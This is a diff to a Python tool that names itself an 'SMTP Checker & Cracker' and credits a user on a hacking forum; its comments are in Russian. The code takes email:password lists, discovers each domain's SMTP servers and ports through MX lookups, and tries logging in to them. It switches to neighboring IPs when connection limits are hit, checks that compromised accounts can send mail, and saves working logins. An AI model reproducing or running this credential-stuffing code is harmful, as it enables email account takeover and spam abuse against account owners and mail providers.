@@ -44,18 +44,18 @@ npt = b+'[\033[37m?\033[37m] '+z
 def show_banner():
 	banner = f"""
 
-              ,▄   .╓███?                ,, .╓███)                              
-            ╓███| ╓█████╟               ╓█/,███╙                  ▄▌            
-           ▄█^[██╓█* ██F   ,,,        ,╓██ ███`     ,▌          ╓█▀             
-          ╓█` |███7 ▐██!  █▀╙██b   ▄██╟██ ▐██      ▄█   ▄███) ,╟█▀▀`            
-          █╟  `██/  ██]  ██ ,██   ██▀╓██  ╙██.   ,██` ,██.╓█▌ ╟█▌               
-         |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
-         ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
-         ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v7.17.15{z}
-                Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
-                https://github.com/aels/mailtools
-                https://t.me/IamLavander
+			  ,▄   .╓███?				,, .╓███)							  
+			╓███| ╓█████╟			   ╓█/,███╙				  ▄▌			
+		   ▄█^[██╓█* ██F   ,,,		,╓██ ███`	 ,▌		  ╓█▀			 
+		  ╓█` |███7 ▐██!  █▀╙██b   ▄██╟██ ▐██	  ▄█   ▄███) ,╟█▀▀`			
+		  █╟  `██/  ██]  ██ ,██   ██▀╓██  ╙██.   ,██` ,██.╓█▌ ╟█▌			   
+		 |█|	`   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌			 
+		 ╟█		  `	▀▀  ╙█▀ `╙`╟█	  `▀▀^`	▀█╙  ╙   ▀█▀`			 
+		 ╙█						   ╙										 
+		  ╙	 {b}MadCat SMTP Checker & Cracker v77.12.15{z}
+				Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
+				https://github.com/aels/mailtools
+				https://t.me/IamLavander
 	"""
 	for line in banner.splitlines():
 		print(line)
@@ -93,7 +93,7 @@ def tune_network():
 		try:
 			import resource
 			resource.setrlimit(8, (2**20, 2**20))
-			print(okk+'tuning rlimit_nofile:          '+', '.join([bold(num(i)) for i in resource.getrlimit(8)]))
+			print(okk+'tuning rlimit_nofile:		  '+', '.join([bold(num(i)) for i in resource.getrlimit(8)]))
 			# if os.geteuid() == 0:
 			# 	print('tuning network settings...')
 			# 	os.system("echo 'net.core.rmem_default=65536\nnet.core.wmem_default=65536\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\nnet.ipv4.tcp_max_orphans=4096\nnet.ipv4.tcp_slow_start_after_idle=0\nnet.ipv4.tcp_synack_retries=3\nnet.ipv4.tcp_syn_retries =3\nnet.ipv4.tcp_window_scaling=1\nnet.ipv4.tcp_timestamp=1\nnet.ipv4.tcp_sack=0\nnet.ipv4.tcp_reordering=3\nnet.ipv4.tcp_fastopen=1\ntcp_max_syn_backlog=1500\ntcp_keepalive_probes=5\ntcp_keepalive_time=500\nnet.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1\nnet.ipv4.ip_local_port_range=32768 65535\ntcp_fin_timeout=60' >> /etc/sysctl.conf")
@@ -222,55 +222,55 @@ def get_alive_neighbor(ip, port):
 		raise Exception('No listening neighbors found for '+ip+':'+str(port))
 
 def guess_smtp_server(domain):
-    global default_login_template, resolver_obj, domain_configs_cache, dangerous_domains, dangerous_regex
-    domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
-    
-    # ПРАВКА: Добавляем все MX записи в список для проверки
-    try:
-        mx_records = list(resolver_obj.resolve(domain, 'mx'))
-        mx_domain = str(mx_records[0].exchange).rstrip('.')  # Первая MX для совместимости
-        
-        # Проверяем dangerous только для первой MX (как в оригинале)
-        if is_ignored_host(mx_domain) or re.search(dangerous_domains, mx_domain) and not re.search(r'\.outlook\.com$', mx_domain):
-            raise Exception(white('skipping domain: '+mx_domain+' (for '+domain+')',2))
-        
-        # Добавляем ВСЕ MX в domains_arr для перебора
-        for mx in mx_records:
-            domains_arr.append(str(mx.exchange).rstrip('.'))
-            
-    except Exception as e:
-        reason = 'solution lifetime expired'
-        msg = 'dns resolver overloaded. switching...'
-        if reason in str(e):
-            return switch_dns_nameserver() and guess_smtp_server(domain)
-        else:
-            raise Exception('no MX records found for: '+domain)
-    
-    if re.search(r'protection\.outlook\.com$', mx_domain):
-        return domain_configs_cache['outlook.com']
-    for host in domains_arr:
-        try:
-            ip = get_rand_ip_of_host(host)
-        except:
-            continue
-        for port in [587, 465, 2525, 25]:
-            debug(f'trying {host}, {ip}:{port}')
-            if is_listening(ip, port):
-                    return ([host+':'+str(port)], default_login_template)
-    raise Exception('no connection details found for '+domain)
+	global default_login_template, resolver_obj, domain_configs_cache, dangerous_domains, dangerous_regex
+	domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
+	
+	# ПРАВКА: Добавляем все MX записи в список для проверки
+	try:
+		mx_records = list(resolver_obj.resolve(domain, 'mx'))
+		mx_domain = str(mx_records[0].exchange).rstrip('.')  # Первая MX для совместимости
+		
+		# Проверяем dangerous только для первой MX (как в оригинале)
+		if is_ignored_host(mx_domain) or re.search(dangerous_domains, mx_domain) and not re.search(r'\.outlook\.com$', mx_domain):
+			raise Exception(white('skipping domain: '+mx_domain+' (for '+domain+')',2))
+		
+		# Добавляем ВСЕ MX в domains_arr для перебора
+		for mx in mx_records:
+			domains_arr.append(str(mx.exchange).rstrip('.'))
+			
+	except Exception as e:
+		reason = 'solution lifetime expired'
+		msg = 'dns resolver overloaded. switching...'
+		if reason in str(e):
+			return switch_dns_nameserver() and guess_smtp_server(domain)
+		else:
+			raise Exception('no MX records found for: '+domain)
+	
+	if re.search(r'protection\.outlook\.com$', mx_domain):
+		return domain_configs_cache['outlook.com']
+	for host in domains_arr:
+		try:
+			ip = get_rand_ip_of_host(host)
+		except:
+			continue
+		for port in [587, 465, 2525, 25]:
+			debug(f'trying {host}, {ip}:{port}')
+			if is_listening(ip, port):
+					return ([host+':'+str(port)], default_login_template)
+	raise Exception('no connection details found for '+domain)
 
 def get_smtp_config(domain):
-    global domain_configs_cache, default_login_template
-    domain = domain.lower()
-    
-    # ПРАВКА: Атомарная проверка и установка (потокобезопасно для чтения)
-    if domain not in domain_configs_cache:
-        # Вычисляем значение один раз
-        config = guess_smtp_server(domain)
-        # Атомарно устанавливаем (если ещё не установлено другим потоком)
-        domain_configs_cache.setdefault(domain, config)
-    
-    return domain_configs_cache[domain]
+	global domain_configs_cache, default_login_template
+	domain = domain.lower()
+	
+	# ПРАВКА: Атомарная проверка и установка (потокобезопасно для чтения)
+	if domain not in domain_configs_cache:
+		# Вычисляем значение один раз
+		config = guess_smtp_server(domain)
+		# Атомарно устанавливаем (если ещё не установлено другим потоком)
+		domain_configs_cache.setdefault(domain, config)
+	
+	return domain_configs_cache[domain]
 
 def quit(signum, frame):
 	print('\r\n'+okk+'exiting... see ya later. bye.')
@@ -296,13 +296,13 @@ def find_email_password_collumnes(list_filename):
 	raise Exception('the file you provided does not contain emails')
 
 def wc_count(filename, lines=0):
-    file_handle = open(filename, 'rb')
-    while True:
-        buf = file_handle.raw.read(1024*1024)
-        if not buf:
-            break
-        lines += buf.count(b'\n')
-    return lines + 1
+	file_handle = open(filename, 'rb')
+	while True:
+		buf = file_handle.raw.read(1024*1024)
+		if not buf:
+			break
+		lines += buf.count(b'\n')
+	return lines + 1
 
 def is_ignored_host(mail):
 	global exclude_mail_hosts
@@ -317,29 +317,29 @@ def socket_send_and_read(sock, cmd=''):
 	return scream
 
 def socket_get_free_smtp_server(smtp_server, port):
-    port = int(port)
-    smtp_server_ip = get_rand_ip_of_host(smtp_server)
-    socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
-    s = socket.socket(socket_type, socket.SOCK_STREAM)
-    s.settimeout(8)  # Увеличено для медленных серверов
-    
-    try:
-        s.connect((smtp_server_ip, port))
-        # ПРАВКА: SSL обёртка ТОЛЬКО ПОСЛЕ успешного подключения для порта 465
-        if port == 465:
-            context = ssl._create_unverified_context()
-            s = context.wrap_socket(s, server_hostname=smtp_server_ip)
-        return s
-    except Exception as e:
-        if re.search(r'too many connections|threshold limitation|parallel connections|try later|refuse', str(e).lower()):
-            smtp_server_ip = get_alive_neighbor(smtp_server_ip, port)
-            s.connect((smtp_server_ip, port))
-            if port == 465:  # Повторная обёртка для нового соединения
-                context = ssl._create_unverified_context()
-                s = context.wrap_socket(s, server_hostname=smtp_server_ip)
-        else:
-            raise Exception(e)
-    return s
+	port = int(port)
+	smtp_server_ip = get_rand_ip_of_host(smtp_server)
+	socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
+	s = socket.socket(socket_type, socket.SOCK_STREAM)
+	s.settimeout(8)  # Увеличено для медленных серверов
+	
+	try:
+		s.connect((smtp_server_ip, port))
+		# ПРАВКА: SSL обёртка ТОЛЬКО ПОСЛЕ успешного подключения для порта 465
+		if port == 465:
+			context = ssl._create_unverified_context()
+			s = context.wrap_socket(s, server_hostname=smtp_server_ip)
+		return s
+	except Exception as e:
+		if re.search(r'too many connections|threshold limitation|parallel connections|try later|refuse', str(e).lower()):
+			smtp_server_ip = get_alive_neighbor(smtp_server_ip, port)
+			s.connect((smtp_server_ip, port))
+			if port == 465:  # Повторная обёртка для нового соединения
+				context = ssl._create_unverified_context()
+				s = context.wrap_socket(s, server_hostname=smtp_server_ip)
+		else:
+			raise Exception(e)
+	return s
 
 def socket_try_tls(sock, self_host):
 	answer = socket_send_and_read(sock, 'EHLO '+self_host)
@@ -386,78 +386,78 @@ def socket_try_mail(sock, smtp_from, smtp_to, data):
 					return True
 	sock.close()
 	raise Exception(answer)
-    
+	
 def smtp_validate_send_capability(sock, smtp_from_domain):
-    """
-    Проверяет, может ли сервер реально отправлять письма
-    БЕЗ отправки: использует MAIL FROM + RSET
-    Возвращает True только если сервер готов к отправке
-    """
-    try:
-        # Проверка 1: MAIL FROM с доменом пользователя
-        test_from = f'test-{uuid.uuid4().hex[:8]}@{smtp_from_domain}'
-        answer = socket_send_and_read(sock, f'MAIL FROM: <{test_from}>')
-        if not answer.startswith('250'):
-            debug(f'SKIP: Server rejected MAIL FROM: {answer[:50]}')
-            return False
-        
-        # Проверка 2: RCPT TO (можно на тестовый ящик)
-        test_recipient = f'validate-{uuid.uuid4().hex[:8]}@example.com'
-        answer = socket_send_and_read(sock, f'RCPT TO: <{test_recipient}>')
-        # 250 = OK, 251 = forward, 451 = temp error (норма для теста)
-        if not re.match(r'^(250|251|451)', answer):
-            debug(f'SKIP: Server rejected RCPT TO: {answer[:50]}')
-            return False
-        
-        # Проверка пройдена! Отменяем транзакцию
-        socket_send_and_read(sock, 'RSET')
-        return True
-        
-    except Exception as e:
-        debug(f'SKIP: Send validation error: {str(e)[:50]}')
-        return False
+	"""
+	Проверяет, может ли сервер реально отправлять письма
+	БЕЗ отправки: использует MAIL FROM + RSET
+	Возвращает True только если сервер готов к отправке
+	"""
+	try:
+		# Проверка 1: MAIL FROM с доменом пользователя
+		test_from = f'test-{uuid.uuid4().hex[:8]}@{smtp_from_domain}'
+		answer = socket_send_and_read(sock, f'MAIL FROM: <{test_from}>')
+		if not answer.startswith('250'):
+			debug(f'SKIP: Server rejected MAIL FROM: {answer[:50]}')
+			return False
+		
+		# Проверка 2: RCPT TO (можно на тестовый ящик)
+		test_recipient = f'validate-{uuid.uuid4().hex[:8]}@example.com'
+		answer = socket_send_and_read(sock, f'RCPT TO: <{test_recipient}>')
+		# 250 = OK, 251 = forward, 451 = temp error (норма для теста)
+		if not re.match(r'^(250|251|451)', answer):
+			debug(f'SKIP: Server rejected RCPT TO: {answer[:50]}')
+			return False
+		
+		# Проверка пройдена! Отменяем транзакцию
+		socket_send_and_read(sock, 'RSET')
+		return True
+		
+	except Exception as e:
+		debug(f'SKIP: Send validation error: {str(e)[:50]}')
+		return False
 
 # Устанавливаем таймаут для SMTP-соединения (30 секунд)
 socket.setdefaulttimeout(30)
 
 def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
-    """
-    Подключается к SMTP-серверу, выполняет логин с 1 повторной попыткой при таймауте.
-    Проверяет возможность отправки MAIL FROM (если validate_send_mode=True)
-    """
-    global verify_email, validate_send_mode
-    if is_valid_email(smtp_user):
-        smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
-    else:
-        smtp_login = smtp_user
+	"""
+	Подключается к SMTP-серверу, выполняет логин с 1 повторной попыткой при таймауте.
+	Проверяет возможность отправки MAIL FROM (если validate_send_mode=True)
+	"""
+	global verify_email, validate_send_mode
+	if is_valid_email(smtp_user):
+		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
+	else:
+		smtp_login = smtp_user
 
-    for attempt in range(2):
-        try:
-            s = socket_get_free_smtp_server(smtp_server, port)
-            answer = socket_send_and_read(s)
-            if answer[:3] == '220':
-                s = socket_try_tls(s, smtp_server) if port != '465' else s
-                s = socket_try_login(s, smtp_server, smtp_login, password)
-                
-                # ВАЖНО: Проверяем, может ли сервер ОТПРАВЛЯТЬ, а не только входить
-                if validate_send_mode:
-                    domain = smtp_user.split('@')[1]
-                    if not smtp_validate_send_capability(s, domain):
-                        s.close()
-                        raise Exception('Gateway detected: AUTH works but cannot send mail (MAIL FROM rejected)')
-                
-                s.close()
-                return True
-            s.close()
-            raise Exception(answer)
-        except (socket.timeout, ConnectionResetError) as e:
-            if attempt == 0:
-                time.sleep(1.5)
-                continue
-            return False
-        except Exception as e:
-            return False
-    return False
+	for attempt in range(2):
+		try:
+			s = socket_get_free_smtp_server(smtp_server, port)
+			answer = socket_send_and_read(s)
+			if answer[:3] == '220':
+				s = socket_try_tls(s, smtp_server) if port != '465' else s
+				s = socket_try_login(s, smtp_server, smtp_login, password)
+				
+				# ВАЖНО: Проверяем, может ли сервер ОТПРАВЛЯТЬ, а не только входить
+				if validate_send_mode:
+					domain = smtp_user.split('@')[1]
+					if not smtp_validate_send_capability(s, domain):
+						s.close()
+						raise Exception('Gateway detected: AUTH works but cannot send mail (MAIL FROM rejected)')
+				
+				s.close()
+				return True
+			s.close()
+			raise Exception(answer)
+		except (socket.timeout, ConnectionResetError) as e:
+			if attempt == 0:
+				time.sleep(1.5)
+				continue
+			return False
+		except Exception as e:
+			return False
+	return False
 
 def worker_item(jobs_que, results_que):
 	global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
@@ -551,8 +551,7 @@ try:
 	start_from_line = int(([i for i in sys.argv if re.match(r'\d+$', i)]+[0]).pop(0))
 	debuglevel = len([i for i in sys.argv if i == 'debug'])
 	rage_mode = len([i for i in sys.argv if i == 'rage'])
-    # Режим проверки отправки (по умолчанию включен)
-    validate_send_mode = '--validate-send' in sys.argv or '--fast' not in sys.argv
+	validate_send_mode = '--validate-send' in sys.argv or '--fast' not in sys.argv
 	if not list_filename:
 		print(inf+help_message)
 		while not os.path.isfile(list_filename):
@@ -601,15 +600,15 @@ print(inf+'loading SMTP configs...'+up)
 load_smtp_configs()
 # print(inf+'loading DNS servers...'+up)
 # load_dns_servers()
-print(wl+okk+'loaded SMTP configs:           '+bold(num(len(domain_configs_cache))+' lines'))
-print(inf+'source file:                   '+bold(list_filename))
-print(inf+'total lines to procceed:       '+bold(num(total_lines)))
-print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(password_collumn))
-print(inf+'ignored email hosts:           '+bold(exclude_mail_hosts))
-print(inf+'goods file:                    '+bold(smtp_filename))
-print(inf+'verification email:            '+bold(verify_email or '-'))
-print(inf+'ipv4 address:                  '+bold(socket.has_ipv4 or '-')+' ('+(socket.ipv4_blacklist or green('clean'))+')')
-print(inf+'ipv6 address:                  '+bold(socket.has_ipv6 or '-'))
+print(wl+okk+'loaded SMTP configs:		   '+bold(num(len(domain_configs_cache))+' lines'))
+print(inf+'source file:				   '+bold(list_filename))
+print(inf+'total lines to procceed:	   '+bold(num(total_lines)))
+print(inf+'email & password colls:		'+bold(email_collumn)+' and '+bold(password_collumn))
+print(inf+'ignored email hosts:		   '+bold(exclude_mail_hosts))
+print(inf+'goods file:					'+bold(smtp_filename))
+print(inf+'verification email:			'+bold(verify_email or '-'))
+print(inf+'ipv4 address:				  '+bold(socket.has_ipv4 or '-')+' ('+(socket.ipv4_blacklist or green('clean'))+')')
+print(inf+'ipv6 address:				  '+bold(socket.has_ipv6 or '-'))
 input(npt+'press '+bold('[ Enter ]')+' to start...')
 
 threading.Thread(target=every_second, daemon=True).start()
